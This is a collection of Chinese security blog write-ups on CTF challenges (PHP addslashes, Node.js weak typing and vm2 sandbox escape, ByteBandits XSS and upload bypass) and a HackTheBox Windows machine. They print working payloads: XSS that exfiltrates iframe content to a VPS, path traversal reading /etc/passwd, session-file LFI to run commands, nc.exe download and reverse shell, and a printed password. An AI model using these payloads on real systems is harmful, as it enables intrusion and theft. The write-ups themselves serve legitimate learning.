本题也是同样的道理。addslashes看似不能绕过。但是因为拼接的是md5后的pass.所以只要找到一个数字md5后的raw内容包含\\即可。 payload 1user&#x3D; OR 1&#x3D;1#&amp;passwd&#x3D;128 summary时隔两个月终于又把auditlabs的坑填完了…… 不得不说里面涵盖的很多php相关漏洞都是些新手刚刚入门平台里的那些经典题目的原理。当初有的半懂不懂，现在算是把坑给填上了。 然后自己最近有些纠结。原本因为接触了一些国际赛后，开始投身nodejs与python相关的漏洞了。出了几道题也都只是node跟python.唯一一道php还是sql注入。可能自己心里对php还是谈不上喜欢吧，没有钻研细节的劲头，更没有进行相关开发的想法。但最近头一次实战发现php仍旧是网站大头之一,并且ctf比赛中php还是有着能够难倒人的绝对水准。假如我想要继续提升实力，仍旧得在php下下不少功夫。更何况看框架的洞已经算最近的一大乐趣了233. 所以说,希望自己还是能花点时间去多看看php.找时间练练手。最后能多出几个题就好了。","categories":[],"tags":[{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"}]},{"title":"学习笔记-Nodejs相关","slug":"Nodejs的一些技巧","date":"2020-04-20T11:43:44.000Z","updated":"2021-02-18T05:09:41.592Z","comments":true,"path":"2020/04/20/Nodejs的一些技巧/","link":"","permalink":"https://www.bycsec.top/2020/04/20/Nodejs%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/","excerpt":"打算写写Node里面最近遇到的知识了。主要还是跟周末的虎符有关吧。作为二队打的,学校虽如期进入线下,但是自己这次还是有点小难受。刷了这么多题了,结果碰到两道并不算擅长的Node题目。只做出来第一道题。吐血的是第二题当时很清楚肯定是Node.js沙盒逃逸，也按照大致流程构造了payload，结果就是打不通。赛后同样的payload上buu一试瞬间成功执行，心态炸裂。老实说Node题也算做了不少次了,相关的漏洞除了原型链比较熟悉其他的都不怎么了解。打算近期一方面把相关的题目多看下，然后就是基础语法巩固下，并且总结几个遇到的有用的trick.","text":"打算写写Node里面最近遇到的知识了。主要还是跟周末的虎符有关吧。作为二队打的,学校虽如期进入线下,但是自己这次还是有点小难受。刷了这么多题了,结果碰到两道并不算擅长的Node题目。只做出来第一道题。吐血的是第二题当时很清楚肯定是Node.js沙盒逃逸，也按照大致流程构造了payload，结果就是打不通。赛后同样的payload上buu一试瞬间成功执行，心态炸裂。老实说Node题也算做了不少次了,相关的漏洞除了原型链比较熟悉其他的都不怎么了解。打算近期一方面把相关的题目多看下，然后就是基础语法巩固下，并且总结几个遇到的有用的trick. 弱类型Node.js使用的是javascript的语法。简单的说 Node.js 就是运行在服务端的 JavaScript。毫无疑问作为弱类型的javascript自然会把这种特性带到服务端,产生一些奇怪的效用。 简单的弱类型的例子 123456var a =200;var b =\"1\";var c= a + b;console.log(c);//2001 字符串与数字经由一个二元运算符最后返回的是数字类型。 1234var obj = &#123;name:'jack'&#125;if(obj)&#123; console.log(1);&#125; 对象可以转化为布尔值。 1234String.prototype.fn = function()&#123;return this&#125;;var a = 'hello';alert(typeof a.fn());alert(a.fn()); 本该返回对象的函数a.fn()隐式的转换成了字符串“hello”显示. 这样就可以借由虎符第一个easy_login的题目来探讨下nodejs的弱类型了。 这道题不出意外应该是按照https://github.com/justcatthefish/ctf/tree/master/2019-04-25-Angstrom2019/web#cookie-cutter 这个改的。原题跟此处的校验几乎一样。那我们来看看虎符这题的关键校验代码： 123456789const sid = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()).secretid;console.log(sid)if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; throw new APIError('login error', 'no such secret id');&#125;const secret = global.secrets[sid];const user = jwt.verify(token, secret, &#123;algorithm: 'HS256'&#125;); 去看原题就能学到姿势：由于sid是跟据第二个’.’的内容取出来的,如果稍微设计一下，比如令值为纯任意字母字符串，就能过那个if的判断并使secrets[sid]返回undefined.这样配合上前面我们置为None的加密方式,即可在jwt.verify时成功解码。 本题跟原题有一丁点的区别：!(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0))这段代码看似限制了我们只能传有效的数组键值即数字,但是数字字符串依旧有效 123456789global.secrets=['supersecretkeyyouwillneverknow','2333333'];const sid=\"00\";console.log(sid);console.log(global.secrets.length);if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)) &#123; console.log(\"no\");&#125;const secret = global.secrets[sid];console.log(secret); 假设这是我们已经注册过2个用户的情况。现在看看执行结果 没有报错。说明正如我们所料,进行&gt;或者&gt;=这两个运算符后字符串sid被转换成了数值类型即 0(number) 0&lt;1 &amp;&amp; 0&gt;=0同时下面的数组键值不存在,即secrets[“00”]不存在。所以这题可以注册n个用户,(至少要有一个),然后传个小于长度的数字字符串就行。 再简单一点的,直接传一个空字符串当然也是可以的。空数组也是同样的道理。且数组如果传元素的话也会遵循跟上面字符串一样的转化规律最后加密即可 1234import jwtpayload = &#123;'secretid': \"00\", 'username': 'admin', 'password': '123'&#125;print(jwt.encode(payload, '', algorithm=None)) 值得一提的是,纯字母字符串与数字比较既不满足大于等于也不满足小于等于，这也是国际赛原题的小技巧。 使用编码\\模板字符\\数组等绕过wafNode.js在编码上也有许多可以绕过的技巧常见的比如八进制,16进制,unicode 1234567\"constructor\"//oct\"\\143\\157\\156\\163\\164\\162\\165\\143\\164\\157\\162\"//hex\"\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72\"//unicode\"\\u0063\\u006f\\u006e\\u0073\\u0074\\u0072\\u0075\\u0063\\u0074\\u006f\\u0072\" 假如想调用命令 123[][&#39;constructor&#39;][&#39;constructor&#39;](&#39;alert(12345)&#39;)()[].constructor.constructor(&#39;alert(12345)&#39;)()Array.constructor(&#39;alert(12345)&#39;)() //上面三种写法是等价的.之前公益赛NodeGame也提到过。 但是要注意一点。这里其他进制以及unicode想要成功被解析成字符串还是得要单或双引号。否则无法成功执行。那么遇到过滤了单双引号的waf怎么办呢？ 这里再给出一种方法。比如这次虎符just_escape我使用的绕过waf的payload：\\u0065val(String.fromCharCode(116,114,121,123,10,32,32,32,32,32,32......)) unicode的绕过不必多说后面字符串使用String.fromCharCode也是xss中经常用到的技巧了。就是这个payload在icq打不通…buu可行。不然我差点怀疑方法构造有问题了…难受 还有一种方法是从赵师傅那里学来的模板字符串的方法,其实自己之前也用过,就是没深刻理解。 简单来用就是用反引号代替双引号.所以上面说只有单双引号才能解析进制是错误的。但是经实验后发现,只有八进制会在被反引号嵌套时出现报错。这点暂时没找到原因,我猜测可能跟八进制过于简便的写法有关吧。(js语法中只要”\\143”这种写法就默认为八进制,最大为”\\377”) 而模板字符串的写法允许我们进行字符拼接 当然针对虎符这道题还有数组绕过的一个姿势,因为只是接受参数，然后进行waf的辨别,使用数组自然也是可行的构造payload上简单了许多。其实原理跟上面弱类型的trick一样，当数组分别为 12[\"process\"] //waf[\"global.process\"] // 绕过 上面被waf挡住显然是因为数组的值直接提取出来与waf中过滤的每一个关键字比较。但是如果是完整的payload字符串显然不会被任何单个的waf关键字匹配到。 下面这个paypal的RCE例子也可以参考下https://artsploit.blogspot.com/2016/08/pprce2.html 关于数组绕过还有一个有趣的trick来自HackTM2020 Draw with ushttps://xz.aliyun.com/t/7177#toc-4里面有一个点,需要获取n的值。但是n又被waf挡住了 12345678910function checkRights(arr) &#123; let blacklist = [\"p\", \"n\", \"port\"]; for (let i = 0; i &lt; arr.length; i++) &#123; const element = arr[i]; if (blacklist.includes(element)) &#123; return false; &#125; &#125; return true;&#125; 这里同样可以使用数组绕过。在js中,a[[“n”]]还是被理解成a.n 所以waf匹配不到,但是这样仍旧能获取n这个键的值。 所以以上几种写法应该可以解决大多数waf了。 命令执行与沙盒逃逸js里调用函数有一个自己之前一直不太懂的点终于弄明白了。 IIFE 123(function()&#123; /* code */ &#125;());(function()&#123; /* code */ &#125;)(); 这是IIFE（立即调用函数表达式）的写法。javascript在遇到它之后将立即执行函数。 在反序列化漏洞CVE-2017-5941 中有一处eval的拼接执行，就是用到了这个。因为eval后的语句是被括号包裹了的。其实说起来也简单。加个括号而已。然后命令在反序列化时直接触发。 然后关于命令执行的几个常见payload,比如原型链中常用的payload 123require('child_process').exec('calc')global.process.mainModule.constructor._load('child_process').exec('calc')global.process.mainModule.require('child_process').exec('calc') 大体上就这几种执行命令的方式。其实简单说就是能获取到child_process这一步就行了。因为Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。而直接require有时候是获取不到的,这点p牛也讲过了。 沙盒逃逸其实沙盒逃逸的题也不时第一次做。之前HITCON也有过这样的题,Confidence上也有沙盒的题。但是这次比赛还是拉胯了。虽然是环境的问题,但要是接触多的话换payload打应该是很轻松的吧。所以还是简单接触下 https://github.com/patriksimek/vm2/issues首先要找现成payload的话,直接上github上issue找就好了,有位dalao专业研究沙盒逃逸,基本上所有版本的payload都是他找的,直接issue里搜breakout即可。 然后是原理。其实就是相当于给个沙盒环境。像process这样的危险代码基本都是undefined的。所以才有了通过this.constructor.constructor(&#39;return this.process.env&#39;)()bypass的payload出现。(跟pythonssti沙盒逃逸差不多不是吗)vm2相比于vm环境限制更加严格。原先通过this获取constructor的方法不再行得通。目前主流的方法主要是通过trycatch语句构造。通过try语句中报错进入到catch块,假如catch块捕捉到的错误比如是由host扔出的,就能利用不加限制的host一步步获取属性到require进而命令执行。 12345678910try &#123; this.process.removeListener(); &#125; catch (host_exception) &#123; console.log('host exception: ' + host_exception.toString()); host_constructor = host_exception.constructor.constructor; host_process = host_constructor('return this')().process; child_process = host_process.mainModule.require(\"child_process\"); console.log(child_process.execSync(\"cat /etc/passwd\").toString()); &#125; 虎符这题则基本就是按hackim的babyjs改的。前端都几乎一样。只不过vm版本换成了3.8.3…所以搜下issue就行了。bypass用上面总结的方法都可以。 关于沙盒逃逸的一些细节我也是不太懂。打算过段时间把国际赛上js沙盒逃逸的题补一下。目前的套路简单有：Error().stack使用此命令可以爆出stack strace.相当于是一个FUZZ手段了.爆出错误信息如vm.js或者vm2.js就可以去收集对应的payload了。 日后再碰到沙盒逃逸的题也会放到文章里总结。希望自己能尽快上手Node.js吧。 Referencehttps://xz.aliyun.com/t/7184https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"Node.js","slug":"Node-js","permalink":"https://www.bycsec.top/tags/Node-js/"}]},{"title":"ByteBanditsCTF2020两道WEB复现","slug":"ByteBanditsCTF2020两道WEB复现","date":"2020-04-13T12:15:56.000Z","updated":"2021-02-18T05:08:50.517Z","comments":true,"path":"2020/04/13/ByteBanditsCTF2020两道WEB复现/","link":"","permalink":"https://www.bycsec.top/2020/04/13/ByteBanditsCTF2020%E4%B8%A4%E9%81%93WEB%E5%A4%8D%E7%8E%B0/","excerpt":"这周末又当了波国际赛划水懒狗。看了几个比赛难度参差不齐。只有bytebandits的难度确实顶。当时看了下NotesApp没做出来就划水去了。所幸官方很贴心的给了docker的环境。现在把两道WEB复现下,都是很有价值的题目。","text":"这周末又当了波国际赛划水懒狗。看了几个比赛难度参差不齐。只有bytebandits的难度确实顶。当时看了下NotesApp没做出来就划水去了。所幸官方很贴心的给了docker的环境。现在把两道WEB复现下,都是很有价值的题目。 NotesAPP这题复现的话有一个问题,就是要改下源码。一个是改bot的访问地址。再一个就是因为里面用了Googlecaptchakey,所以得换。但是我给自己的vps申请的key换了后还是不顶用。索性把相关的html跟python代码删掉了,姑且是能做了hhh. 首先题目给了源码。现在可以到官方github上看https://github.com/ByteBandits/bbctf-2020/tree/master/web/notes 简单审计后首先注意到一个markdown xss 1234567891011121314@app.route(\"/profile\")@login_requireddef profile(): return render_template(\"profile.html\", current_user = current_user)@app.route(\"/update_notes\", methods=[\"POST\"])@login_requireddef update_notes(): if current_user.id == 'admin': return \"Nope.\" # markdown support!! current_user.notes = markdown2.markdown(request.form.get('notes'), safe_mode = True) db.session.commit() return redirect(\"/profile\") 登录进去后在/profile路由即可updatemarkdown内容。这里自然想到markdownxss。不过当时尝试了下并没有打出来。因为这里用到的是markdown2这个库的safe_mode。html标签都会直接转义。后来发现用到的是github上的一个issue.https://github.com/trentm/python-markdown2/issues/341safe_mode或者escape都有对应的xsspayload 1&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;q?&lt;!-&lt;[&lt;script&gt;alert(1);&#x2F;\\*](http:&#x2F;&#x2F;g)-&gt;a&gt;&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;g.c?&lt;!-&lt;[a\\\\*&#x2F;&lt;&#x2F;script&gt;alert(1);&#x2F;*](http:&#x2F;&#x2F;g)-&gt;a&gt; 得到一个self-xss. 得到self-xss的第一步就是应该考虑如何提升xss的危害性。因为我们的题目还有一处/send_link路由明显是提交url后让bot进行访问。那么这里可能需要考虑csrf。因为只有admin登录访问profile会得到flag。我们访问自己的profile只能得到自己的内容。传统的CSRF一定是遵循以下原则的： 121.登录受信任网站A，并在本地生成Cookie。2.在不登出A的情况下，访问危险网站B。 那么基于此题bot的存在,我们大概的流程是： 1231.让bot访问profile,此时存在flag2.logout3.登录构造好payload的用户，并加载payload.得到admin的信息 但是存在几个细节：如何控制bot登出并登录？如何让我们的payload能够得到admin页面的信息？ 仔细观察发现一个细节。当我们注册时,用户名与密码通过post方式请求。但是当我们登出再登录时，却是通过get请求进行登录。因此先登出再登录的细节就解决了。至于加载admin的信息，使用到的自然是经典的iframe xss 。原来总结CSP时用过。经典的利用就是：一个同源页面，一个是CSP保护的flag页面A，一个是存在xss的页面B。只需要一个iframe就能窃取到flag. 1234var iframe = document.createElement('iframe');iframe.src=\"A页面\";document.body.appendChild(iframe);setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById('flag').innerHTML),1000); 此题并没有对iframe的限制。自然是可行的 所以构思后我们的payload应该是 1231.提交url,让bot访问我们vps上的内容2.先加载一个iframe去访问profile并登出3.再加载一个iframe，通过url直接登录我们自建账号。触发payload 然而这题有个坑 注意到visit_link.py中 12345678910111213141516171819202122232425262728293031323334import asynciofrom pyppeteer import launchfrom redis import Redisfrom rq import Queueimport osimport psutil, signalasync def main(url): browser = await launch(headless=True, executablePath=\"/usr/bin/chromium-browser\", args=['--no-sandbox', '--disable-gpu']) try: page = await browser.newPage() await page.goto(\"https://notes.web.byteband.it/login\") await page.type(\"input[name='username']\", \"admin\") await page.type(\"input[name='password']\", os.environ.get(\"ADMIN_PASS\")) await asyncio.wait([ page.click('button'), page.waitForNavigation(), ]) newPage = await browser.newPage() await newPage.goto(url) except Exception as e: raise e finally: await browser.close()def visit_url(url): asyncio.get_event_loop().run_until_complete(main(url))q = Queue(connection=Redis(host='redis')) 这串异步代码让admin只要访问了后立即退出。也就是说我们的payload并不会有时间触发。 因此需要额外设计，比如起一个flask控制bot访问时进行停顿，这样就有时间触发payload了。下面是dalao的脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#!/usr/bin/env python3import timefrom http.server import BaseHTTPRequestHandler,HTTPServerPORT_NUMBER = 8877SERVER = \"https://notes.web.byteband.it\"USERNAME = \"abc\"PASSWORD = \"123\"EXPLOIT = \"\"\"&lt;html&gt;&lt;body&gt;&lt;script type='text/javascript'&gt;function loginUser() &#123;&#123; var iframe = document.createElement('iframe'); iframe.style.display = \"none\"; iframe.src = \"&#123;server&#125;/login?username=&#123;username&#125;&amp;password=&#123;password&#125;\"; iframe.sandbox = \"allow-same-origin allow-scripts\"; document.body.appendChild(iframe);&#125;&#125;;function logoutUser() &#123;&#123; var iframe = document.createElement('iframe'); iframe.style.display = \"none\"; iframe.onload = loginUser; iframe.src = \"&#123;server&#125;/logout\"; iframe.sandbox = \"allow-same-origin allow-scripts\"; document.body.appendChild(iframe);&#125;&#125;;&lt;/script&gt;&lt;iframe id=\"iframe01\" name=\"iframe01\" src=\"&#123;server&#125;/profile\" sandbox=\"allow-same-origin allow-scripts\" onload=\"logoutUser(this)\"&gt;&lt;/iframe&gt;&lt;/body&gt;&lt;/html&gt;\"\"\".format(server=SERVER, username=USERNAME, password=PASSWORD)class MyServer(BaseHTTPRequestHandler): def do_GET(self): self.send_response(200) self.send_header(\"Content-type\", \"text/html\") self.end_headers() self.wfile.write(EXPLOIT.encode('utf-8')) time.sleep(10) # keep open for some time for exploit to finishmyServer = HTTPServer((\"0.0.0.0\", PORT_NUMBER), MyServer)print(time.asctime(), \"Server Starts - %s:%s\" % (\"0.0.0.0\", PORT_NUMBER))try: myServer.serve_forever()except KeyboardInterrupt: passmyServer.server_close()print(time.asctime(), \"Server Stops - %s:%s\" % (\"0.0.0.0\", PORT_NUMBER)) 从这行代码就能看出主要流程跟之前构思的思路是一致的。&lt;iframe id=&quot;iframe01&quot; name=&quot;iframe01&quot; src=&quot;{server}/profile&quot; sandbox=&quot;allow-same-origin allow-scripts&quot; onload=&quot;logoutUser(this)&quot;&gt;&lt;/iframe&gt;主要就是要sleep10s.在vps上运行。然后我们用自己的abc用户updatepayload 1&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;q?&lt;!-&lt;[&lt;script&gt;(new Image).src &#x3D; &#39;http:&#x2F;&#x2F;vpsip:port&#x2F;?data&#x3D;&#39; + escape(parent.frames[&#39;iframe01&#39;].document.body.getElementsByClassName(&quot;hero-body&quot;)[0].innerText);&#x2F;\\*](http:&#x2F;&#x2F;g)-&gt;a&gt;&lt;http:&#x2F;&#x2F;g&lt;!s:&#x2F;&#x2F;g.c?&lt;!-&lt;[a\\\\*&#x2F;&lt;&#x2F;script&gt;alert(1);&#x2F;*](http:&#x2F;&#x2F;g)-&gt;a&gt; 起到窃取iframe内容的作用,获取的内容源自hero-body这个class的内容。最后url提交vpsip:port即可解码即可发现flag 12Howdy admin!flag&#123;ch41n_tHy_3Xploits_t0_w1n&#125; ImgAccess2这题很有营养。首先上来一个文件上传。根据题意只能是图片,同时上传后进入到upload路由,并能通过/view/md5.../filename访问到自己的图片 那么当然要考虑文件上传getshell了。但是首先注意到,从题目的路由与cookie明显提醒我们这是python起的web服务。但是同时访问404时出现的是类似apache的404页面 并且路径上出现的是/view/xxxx而不是upload/xxxxx,也就意味着，我们需要找出真正的上传路径 尝试upload/xxx/1.jpg发现返回404 但是将upload改为uploads时发现可以访问到我们的上传图片了。 因此确定，真实的上传路径是uploads且可以访问到。此时考虑是否能利用这个路径做些文章 相对容易想到的应该是路径穿越了，但尝试构造普通路径穿越失败。不过路径穿越还有一种相对比较熟悉的绕过姿势。比如urlencode两次的路径穿越,(phpmyadmin4.8.1就曾出现过)那么此处尝试对路径穿越进行二次url编码../../../../../etc/passwd 12345678910import requestsfrom urllib.parse import quote_plus as urlencodeurl='http://xxxxxxx:7003/uploads/'filepath='../../../../../../etc/passwd'filepath=urlencode(filepath)filepath=urlencode(filepath)r=requests.get(url+filepath)print(r.text) 发现成功读取了/etc/passwd接下来肯定是想要得到其他有用信息了，比如app.py的源码想先读/proc/self/environ,发现没内容。但是不要紧，此时必然可行的方法是利用/proc/self/cwd指向当前工作目录的特性，直接读取app.py/proc/self/cwd/app.py 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768from flask import Flask, render_template, request, flash, redirect, send_filefrom urllib.parse import urlparseimport reimport osfrom hashlib import md5import asyncioimport requestsapp = Flask(__name__)app.config['UPLOAD_FOLDER'] = os.path.join(os.curdir, \"uploads\")# app.config['UPLOAD_FOLDER'] = \"/uploads\"app.config['MAX_CONTENT_LENGTH'] = 1*1024*1024app.secret_key = b'_5#y2L\"F4Q8z\\n\\xec]/'ALLOWED_EXTENSIONS = &#123;'png', 'jpg', 's'&#125;if not os.path.exists(app.config['UPLOAD_FOLDER']): os.mkdir(app.config['UPLOAD_FOLDER'])def secure_filename(filename): return re.sub(r\"(\\.\\.|/)\", \"\", filename)def allowed_file(filename): return '.' in filename and \\ filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route(\"/\")def index(): return render_template(\"home.html\")@app.route(\"/upload\", methods=[\"POST\"])def upload(): caption = request.form[\"caption\"] file = request.files[\"image\"] if file.filename == '': flash('No selected file') return redirect(\"/\") elif not allowed_file(file.filename): flash('Please upload images only.') return redirect(\"/\") else: if not request.headers.get(\"X-Real-IP\"): ip = request.remote_addr else: ip = request.headers.get(\"X-Real-IP\") dirname = md5(ip.encode()).hexdigest() filename = secure_filename(file.filename) upload_directory = os.path.join(app.config['UPLOAD_FOLDER'], dirname) if not os.path.exists(upload_directory): os.mkdir(upload_directory) upload_path = os.path.join(app.config['UPLOAD_FOLDER'], dirname, filename) file.save(upload_path) return render_template(\"uploaded.html\", path = os.path.join(dirname, filename))@app.route(\"/view/&lt;path:path&gt;\")def view(path): return render_template(\"view.html\", path = path)@app.route(\"/uploads/&lt;path:path&gt;\")def uploads(path): # TODO(noob): # zevtnax told me use apache for static files. I've # already configured it to serve /uploads_apache but it # still needs testing. I'm a security noob anyways. return send_file(os.path.join(app.config['UPLOAD_FOLDER'], path))if __name__ == \"__main__\": app.run(port=5000) 发现几个信息。首先是uploads路由里存在明显的提示。暗示我们/uploads_apache/路径 然后是文件名的检查。很奇怪的是文件名的白名单里有个s.之后先调用allowed_file()进行文件后缀检查，然后调用secure_filename()进行文件名检查第一个函数只检查最后一个.后的后缀。而第二个函数将..替换为空那么这必然存在绕过.联系到这是一个apache服务器,且只允许图片上传。考虑上传.htaccess进行getshell同时为了绕过文件名，使用.htacces..s第一个函数检查时判定后缀为s,在白名单内。第二个函数将..替换为空，成功达到上传.htaccess的效果 内容addtype application/x-httpd-php .jpg成功上传,直接上传图片马getshell。 getshell后发现没有flag.比赛时题目有提示flag在secretserver:1337。所以方便直接下手。靶机没有curl，那就直接wget即可。 不过就算不知道提示也可以做，容器里有python3，那就肯定可以探测端口从/etc/hosts得知ip为192.168.128.2.那就顺着探吧。用上忘记从哪位大佬那嫖来的脚本，做buu时用过。 123456789101112131415161718import socketdef foo(): with open('active_port.txt','at') as f: for i in range(65535+1): ip = '192.168.128.3' try: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((ip,i)) s.close() f.writelines(str(i)+'\\n') except socket.error: pass f.close() passif __name__ == '__main__': foo() print('ok') 也可以发现1337端口开放。先wget 192.168.128.3:1337得到index.html其中内容提示了./flag.txt直接wget 192.168.128.3:1337/flag.txt即可 Referenceshttps://www.sigflag.at/blog/2020/writeup-bytebandits2020-notes-app/","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"}]},{"title":"hackthebox-Sniper--初尝windows靶机","slug":"hackthebox-Sniper-初尝windows靶机","date":"2020-04-01T03:55:54.000Z","updated":"2021-02-18T05:09:25.753Z","comments":true,"path":"2020/04/01/hackthebox-Sniper-初尝windows靶机/","link":"","permalink":"https://www.bycsec.top/2020/04/01/hackthebox-Sniper-%E5%88%9D%E5%B0%9Dwindows%E9%9D%B6%E6%9C%BA/","excerpt":"好久没做htb的靶机，这次又跟着着大佬的思路去做了一台新的靶机。不同以往的是,这次的靶机Sniper是windows靶机，因此也收获了许多新姿势。就是在中间从github下了不少东西……因为不是假期，具体过程不会像以往那么详细。同时windows靶机下自己不太理解的东西也希望不会给别人带进误区。有趣的是,这台靶机获得webroot的shell有不同的操作方法，同时具体后面提权时也将有不同的方法进行细节上不同的操作。具体细节将在后面的文章中提到。","text":"好久没做htb的靶机，这次又跟着着大佬的思路去做了一台新的靶机。不同以往的是,这次的靶机Sniper是windows靶机，因此也收获了许多新姿势。就是在中间从github下了不少东西……因为不是假期，具体过程不会像以往那么详细。同时windows靶机下自己不太理解的东西也希望不会给别人带进误区。有趣的是,这台靶机获得webroot的shell有不同的操作方法，同时具体后面提权时也将有不同的方法进行细节上不同的操作。具体细节将在后面的文章中提到。 攻击机ip： kalilinux 10.10.15.189靶机ip windows10 10.10.10.151 端口扫描首先是老套的端口扫描 1234567891011121314151617181920212223Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-01 09:20 CSTNmap scan report for 10.10.10.151Host is up (0.24s latency).Not shown: 996 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Sniper Co.135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds?Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 7h02m38s| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2020-04-01T08:23:29|_ start_date: N/A 可以看到是一台windows靶机，配有IIS服务。不过开启的几个端口中包含了445端口,这是SMB服务开放的端口。 port 445: Microsoft Windows SMB Server远程代码执行漏洞 著名的永恒之蓝漏洞也是通过这一端口利用的。当然这里并没有什么渗透点，只是说明我们可以通过smbserver连接到靶机,尝试基本的smb连接的话发现必然是要密码的。 那么还是从80端口入手。访问网页，发现是php网页。IIS+php实际上是非常奇怪的配置,但我们显然可以以此为入手点。 LFI/RFI=&gt;命令执行=&gt;webshell首先在blog下发现一个语言切换功能，其参数可以文件包含。/blog?lang=blog-en.php尝试伪协议等常规套路读源码均以失败告终。简单读windows的文件?lang=/windows/system32/license.rtf发现有回显。那么现在目的是得到一个web-root的shell，如何操作呢？此时有一种相对”简单”的办法,利用上面提到的是smb服务。我们再本机kali新建一个smb服务，然后直接rfi进行操作。RFI的基本操作套路如下 1&#x2F;?lang&#x3D;\\\\10.10.14.62\\share\\foo.php 但是需要注意。想通过SMB达成rfi我们必须修改本机的是smb服务的权限,控制文件夹的权限为777等等，操作起来对我这样的小白而言相对困难了。那么有没有其他方法得到webshell呢? 有,而这也是我学到的不同于常规套路的方法。回到之前php网页的思路上。有这样的一个细节可以注意：这是一个windows靶机的php服务，其session值被存储在固定的文件夹了。我们尝试一下随意注册一个用户名，并且记录下session值。通过下面的payload包含session 1lang&#x3D;&#x2F;Windows&#x2F;Temp&#x2F;sess_1d6bfk00vc159thng1t5q521qg 此时查看包含的结果，发现是含有用户名的序列化数据。那么类似于之前tp5的session固定存储类的漏洞，我们可以从这里下手，将php代码写入session数据。 首先尝试简单的fuzz,发现用户名过滤了一些关键字。这里直接给出可行的payload及回显 123&lt;?=`whoami`?&gt;lang=/Windows/Temp/sess_1d6bfk00vc159thng1t5q521qgusername|s:13:\"nt authority\\iusr 利用短标签加反引号直接执行命令。可以看到成功执行whoami。接下来可以写webshell,也可以直接命令执行。这里直接进行命令执行。 尝试常规的powershell反弹shell失败。之后会发现可能是因为powershell运行在constraintmode的原因。但是不要紧，利用lfi+命令执行我们还有其他方法拿到windows靶机的shell。首先找到本机的netcat(即平时使用的nc),把它传到windows机上。(当然需要先建好www文件夹,并把本机的nc.exe复制到里面)payload: 1echo 'wget 10.10.15.189/nc.exe -O \\windows\\temp\\exp.exe' | iconv -t utf-16le | base64 -w 0 将准备好的payload进行编码避免过滤。注册新用户名为 1&lt;?=`powershell /enc &#123;your encoded command &#125;`?&gt; 这里使用/enc是powershell对应的解码flag,没使用-enc是为了解决过滤问题。然后包含对应的用户的session即可执行。再利用lfi检查是否已经把nc传上去了 很好。那么再进行反弹shell的命令吧。payload: 1echo 'c:\\windows\\temp\\exp.exe 10.10.15.189 8899 -e powershell' | iconv -t utf-16le | base64 -w 0 本机监听8899.浏览器包含,并得到webshell user shell拿到webshell后我们首先检查下源码。很快就有所发现\\user\\db.php中可以发现一个数据库的密码36mEAhz/B8xQ~2VM.而且在User中可以发现用户Chris的存在。下面尝试拿到usershell.这里将再次用到我们之前使用过的端口转发。不过需要一个工具来帮助我们实现。https://github.com/jpillora/chisel从githubrelease处下载chisel的linux与windows版本。分别用于本机与靶机。然后wget把windows版本的传输到靶机上。 123456kali: chmod +x chisel_linux_amd64./chisel_linux_amd64 server -p 8000 --reverseshell: wget http://10.10.15.189/chisel.exe -O chisel.exe portforwarding: .\\chisel.exe client 10.10.15.189:8000 R:5985:127.0.0.1:5985 R:3306:127.0.0.1:3306 开启--reverse允许我们转发端口。而最后一步我们把5985与3306端口转发到本地。5985对应的是WinRM服务，可用于远程管理。我们把它转发到本地后，可以利用另一个渗透工具evil-winrm进行用户登录。 12git clone https://github.com/Hackplayers/evil-winrmsudo gem install winrm winrm-fs stringio 只需两步即可使用。然后evil-winrm继续登录，直接本地127.0.0.1即可。因为我们端口已经转发好了。./evil-winrm.rb -u chris -p &#39;36mEAhz/B8xQ~2VM&#39; -i 127.0.0.1拿到usershell. 之所以用这么多工具进行user的提权其实是因为这里想要通过其他方法得到usershell要再次反弹shell.并且操作起来有点麻烦.这里我简单提一下，就是直接通过powershell命令创建一个属于Chris的变量，然后再反弹shell. 123$pass = convertto-securestring '36mEAhz/B8xQ~2VM' -asplaintext -force$cred = new-object system.management.automation.pscredential(\"sniper\\chris\", $pass)invoke-command -computer sniper -scriptblock &#123; whoami &#125; -credential $cred 变量成功创建的话，最后一条命令的回显应该是sniper\\chris然后下面的命令可以重新弹shell，得到usershell 1invoke-command -computer sniper -scriptblock &#123; c:\\windows\\temp\\exp.exe 10.10.15.189 1234 -e powershell.exe &#125; -credential $cred rootshell那么又到了最后的root提权时间。在C:\\docs中可以发现这样一个有趣的txt 12345Hi Chris,Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it.And I hope that you&#39;ve prepared the documentation for our new app. Drop it here when you&#39;re done with it.Regards,Sniper CEO. 